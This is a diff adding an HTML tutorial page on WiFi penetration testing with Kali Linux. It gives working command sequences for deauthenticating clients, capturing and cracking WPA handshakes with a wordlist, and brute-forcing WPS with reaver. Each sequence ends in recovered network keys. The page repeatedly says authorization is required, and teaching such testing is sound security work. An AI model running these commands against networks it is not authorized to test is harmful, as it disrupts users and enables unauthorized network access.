@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Ethical WiFi Penetration Testing with Kali Linux</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');
+    body {
+      margin: 0;
+      background: #121212;
+      color: #e0e0e0;
+      font-family: 'Poppins', sans-serif;
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    header {
+      background: linear-gradient(90deg, #0077ff 0%, #00d2ff 100%);
+      padding: 2rem 1rem;
+      text-align: center;
+      box-shadow: 0 5px 10px rgba(0,123,255,0.5);
+    }
+    header h1 {
+      margin: 0;
+      font-weight: 700;
+      font-size: 2.5rem;
+      color: #fff;
+      text-shadow: 0 0 8px rgba(0,255,255,0.7);
+    }
+    main {
+      flex: 1;
+      max-width: 960px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+    section {
+      background: #1e1e1e;
+      border-radius: 10px;
+      padding: 2rem 2.5rem;
+      margin-bottom: 2.5rem;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      transition: transform 0.3s ease;
+    }
+    section:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 12px 35px rgba(0,123,255,0.9);
+    }
+    h2 {
+      color: #00d2ff;
+      margin-bottom: 1rem;
+      font-weight: 700;
+      border-bottom: 3px solid #0077ff;
+      padding-bottom: 0.3rem;
+      font-size: 1.9rem;
+      text-shadow: 0 0 5px #00d2ff;
+    }
+    p {
+      margin-bottom: 1.2rem;
+      color: #ccc;
+      font-size: 1.05rem;
+    }
+    ul, ol {
+      margin-left: 1.4rem;
+      margin-bottom: 1.5rem;
+      color: #bbb;
+      font-size: 1.05rem;
+    }
+    li {
+      margin-bottom: 0.7rem;
+    }
+    code {
+      background: #272727;
+      color: #00ffcc;
+      padding: 0.15rem 0.4rem;
+      border-radius: 4px;
+      font-family: 'Source Code Pro', monospace, monospace;
+      font-size: 0.95rem;
+    }
+    pre {
+      background: #222;
+      padding: 1rem 1.2rem;
+      overflow-x: auto;
+      border-radius: 10px;
+      color: #00ffcc;
+      font-family: 'Source Code Pro', monospace, monospace;
+      font-size: 0.95rem;
+      line-height: 1.4;
+      margin-bottom: 1.5rem;
+      box-shadow: inset 0 0 15px #00d2ff80;
+    }
+    footer {
+      background: #111;
+      padding: 1rem 1rem;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #666;
+      user-select: none;
+    }
+    a {
+      color: #00bfff;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    @media (max-width: 700px) {
+      main {
+        margin: 1rem;
+        padding: 0 0.8rem;
+      }
+      header h1 {
+        font-size: 1.8rem;
+      }
+      section {
+        padding: 1.6rem 1.5rem;
+      }
+      h2 {
+        font-size: 1.5rem;
+      }
+      code, pre {
+        font-size: 0.85rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Ethical WiFi Penetration Testing with Kali Linux</h1>
+  </header>
+  <main>
+    <section>
+      <h2>Introduction</h2>
+      <p>
+        Kali Linux offers an extensive set of tools for penetration testing and cybersecurity research. Among its capabilities, it provides utilities to analyze and test the security of WiFi networks. This website outlines an overview of the tools and commands used in ethical WiFi penetration testing.
+      </p>
+      <p>Always ensure you have explicit permission before testing any networks. Unauthorized attempts to access networks are illegal.</p>
+    </section>
+    <section>
+      <h2>WiFi Security Protocols</h2>
+      <p>Understanding the common WiFi encryption types is essential for assessing vulnerabilities:</p>
+      <ul>
+        <li><strong>WEP:</strong> An outdated protocol, easily compromised.</li>
+        <li><strong>WPA/WPA2:</strong> Widely used; security depends on password strength.</li>
+        <li><strong>WPA3:</strong> Most secure; significantly more challenging to crack.</li>
+      </ul>
+    </section>
+    <section>
+      <h2>Common Kali Linux Tools & Commands for WiFi Testing</h2>
+      <p>The following tools form the core toolkit for WiFi penetration testing:</p>
+      <ul>
+        <li><strong>airmon-ng:</strong> Enables monitor mode on your wireless interface.</li>
+        <li><strong>airodump-ng:</strong> Captures WiFi packets and collects information about access points and clients.</li>
+        <li><strong>aireplay-ng:</strong> Performs packet injection and various attacks (deauthentication, fake authentication).</li>
+        <li><strong>aircrack-ng:</strong> Cracks WEP and WPA-PSK keys using captured packets.</li>
+        <li><strong>reaver:</strong> Exploits WPS vulnerabilities to recover WPA/WPA2 passphrases.</li>
+      </ul>
+      <p>Example commands:</p>
+      <pre><code># 1. Enable monitor mode on interface wlan0
+sudo airmon-ng start wlan0
+
+# 2. Scan and capture packets on a specific channel (e.g., channel 6)
+sudo airodump-ng wlan0mon --channel 6 --write capture
+
+# 3. Send deauthentication packets to disconnect clients (to capture handshake)
+sudo aireplay-ng --deauth 10 -a [AP_MAC] wlan0mon
+
+# 4. Crack WPA handshake with wordlist
+sudo aircrack-ng capture-01.cap -w /path/to/wordlist.txt
+
+# 5. Stop monitor mode
+sudo airmon-ng stop wlan0mon
+</code></pre>
+    </section>
+    <section>
+      <h2>Step-by-Step Example Workflow</h2>
+      <ol>
+        <li><strong>Set up monitor mode:</strong> Put your wireless card into monitor mode to listen to all traffic.
+          <pre><code>sudo airmon-ng start wlan0</code></pre>
+        </li>
+        <li><strong>Identify target network:</strong> Use airodump-ng to scan channels and capture data.
+          <pre><code>sudo airodump-ng wlan0mon</code></pre>
+          Note down the target network's BSSID and channel.
+        </li>
+        <li><strong>Focus capture on target:</strong>
+          <pre><code>sudo airodump-ng --bssid [TARGET_BSSID] --channel [CHANNEL] --write capture wlan0mon</code></pre>
+        </li>
+        <li><strong>Deauthenticate clients:</strong> To capture WPA handshake, force clients to reconnect.
+          <pre><code>sudo aireplay-ng --deauth 10 -a [TARGET_BSSID] wlan0mon</code></pre>
+        </li>
+        <li><strong>Crack captured handshake:</strong> Using a wordlist such as <code>rockyou.txt</code>.
+          <pre><code>sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt</code></pre>
+        </li>
+        <li><strong>Disable monitor mode:</strong>
+          <pre><code>sudo airmon-ng stop wlan0mon</code></pre>
+        </li>
+      </ol>
+    </section>
+    <section>
+      <h2>WPS Attack with Reaver</h2>
+      <p>WPS (Wi-Fi Protected Setup) can be vulnerable to brute force attacks:</p>
+      <pre><code>sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon
+sudo reaver -i wlan0mon -b [TARGET_BSSID] -vv</code></pre>
+      <p>Use with caution and only on authorized networks. Reaver attempts to retrieve the WiFi password by exploiting WPS vulnerabilities.</p>
+    </section>
+    <section>
+      <h2>Important Legal & Ethical Notice</h2>
+      <p>
+        Penetration testing must be authorized by the network owner. Attempting to access or crack networks without permission is illegal and punishable by law in most countries.
+      </p>
+      <p>
+        Use these techniques strictly for educational purposes or on your own networks. Always respect privacy, data protection laws, and professional ethical guidelines.
+      </p>
+      <p>For formal ethical hacking training, consider certifications such as <a href="https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/" target="_blank" rel="noopener noreferrer">Certified Ethical Hacker (CEH)</a>.</p>
+    </section>
+  </main>
+  <footer>
+    &copy; 2024 Ethical WiFi Penetration Testing Guide. Use responsibly and legally.
+  </footer>
+</body>
+</html>
+
